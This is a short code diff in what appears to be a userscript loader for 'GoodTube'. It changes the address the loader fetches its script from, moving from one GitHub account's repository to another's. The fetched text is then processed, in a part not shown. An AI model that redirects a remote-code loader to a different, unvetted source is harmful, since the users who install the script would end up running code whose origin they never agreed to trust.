@@ -57,7 +57,7 @@
 		loadAttempts++;
 
 		// Load GoodTube
-		fetch('https://raw.githubusercontent.com/goodtube4u/goodtube/refs/heads/main/goodtube.js')
+		fetch('https://raw.githubusercontent.com/tradewind886/goodtube/refs/heads/main/goodtube.js')
 			// Success
 			.then(response => response.text())
 			.then(data => {
